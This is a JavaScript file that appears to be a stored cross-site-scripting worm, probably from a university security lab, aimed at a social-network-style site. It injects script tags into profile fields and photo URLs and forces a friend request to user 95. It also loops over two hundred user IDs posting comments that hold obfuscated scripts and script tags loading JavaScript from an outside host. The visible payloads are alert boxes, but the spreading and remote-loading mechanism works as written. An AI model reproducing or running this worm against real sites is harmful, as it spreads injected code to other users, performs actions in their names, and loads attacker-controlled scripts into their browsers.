const payload_obfuscated = '--><script>var _0x9953=["\x62\x69\x6E\x67\x75\x73"];alert(_0x9953[0])</script>'
const payload_remote = "<script src='http://people.rit.edu/msf9542/bingus.js'></script>"
const payload_remote_and_obfuscated = "<script src='http://people.rit.edu/msf9542/bingus_again.js'></script><!--"

const bingus_image = "http://people.rit.edu/msf9542/bingus.jpg"

const bingus_xss = "<script>alert('bingus')</script>"

function send_request(value){
    var request = new XMLHttpRequest();
	request.open("POST", `/change_about.php`, true);
	request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	request.send(`type=${value}&value=${bingus_xss}`);
}

send_request('phone');
send_request('school');
send_request('relationship');
send_request('interests');
send_request('interested');
send_request('screen');

function change_photo(){
    var request = new XMLHttpRequest();
	request.open("POST", `/change_photo.php`, true);
	request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	request.send(`type=profile&url=${bingus_xss}`);
}

change_photo()

function add_friend() {
    var request = new XMLHttpRequest();
	request.open("GET", `/add_friend.php?id=95`, true);
	request.send();
}

add_friend();

function add_comment(user_id, comment) {
    var request = new XMLHttpRequest();
	request.open("GET", `/add_friend.php?id=${user_id}&comment=${comment}`, true);
	request.send();
}

function send_payloads(){
    for(let user_id = 0; user_id < 200; user_id++) {
        if (user_id != 95) {
            add_comment(user_id, payload_obfuscated);
            add_comment(user_id, payload_remote);
            add_comment(user_id, payload_remote_and_obfuscated);
        }
    }
}

send_payloads();
	
var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
var dateTime = date+' '+time;

add_comment(95, '-->' + dateTime + '<!--');